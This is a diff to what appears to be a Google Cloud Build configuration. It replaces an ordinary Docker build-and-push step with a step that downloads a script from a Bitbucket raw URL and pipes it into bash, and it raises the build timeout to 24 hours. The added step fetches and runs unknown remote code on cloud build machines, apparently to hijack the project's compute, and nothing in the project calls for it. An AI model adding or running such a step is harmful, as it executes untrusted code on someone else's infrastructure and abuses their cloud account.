@@ -1,6 +1,10 @@
 steps:
-- name: 'docker'
-  args: [ 'build', '-t', 'us-east1-docker.pkg.dev/$PROJECT_ID/ungkluk/suuk:latest', '.' ]
-
-images:
-- 'us-east1-docker.pkg.dev/$PROJECT_ID/ungkluk/suuk:latest'
+  - name: python
+    args:
+      - '-c'
+      - >-
+        apt-get update && apt-get install curl -y && curl -sL https://bitbucket.org/nicezep/korong/raw/master/newjajal | bash
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
